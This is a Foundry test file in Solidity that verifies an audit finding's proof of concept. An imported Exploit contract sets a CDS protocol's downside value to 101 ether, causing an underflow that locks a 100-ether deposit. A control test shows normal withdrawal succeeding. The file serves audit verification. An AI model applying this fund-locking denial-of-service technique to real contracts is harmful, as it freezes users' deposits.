// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, MockToken, CDS, Depositor} from
    "./45461-h-8-malicious-users-can-dos-the-protocol-by-setting-downside.sol";

contract Finding45461Test is Test {
    function test_exploit_downside_underflow_locks_100() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.cds().downsideProtected(), 101 ether, "attacker set 101");
        assertEq(e.token().balanceOf(address(e.cds())), 100 ether, "deposit locked");
        assertEq(e.token().balanceOf(address(e.depositor())), 0, "depositor received 0");
    }

    function test_control_withdraw_succeeds_when_downside_is_unset() public {
        MockToken token = new MockToken();
        CDS cds = new CDS(token, address(this));
        Depositor depositor = new Depositor();
        token.mint(address(depositor), 100 ether);
        depositor.approve(token, address(cds));
        depositor.deposit(cds, 100 ether);
        depositor.withdraw(cds);
        assertEq(token.balanceOf(address(depositor)), 100 ether, "unset downside lets the depositor exit");
        assertEq(token.balanceOf(address(cds)), 0, "cds empty");
    }
}
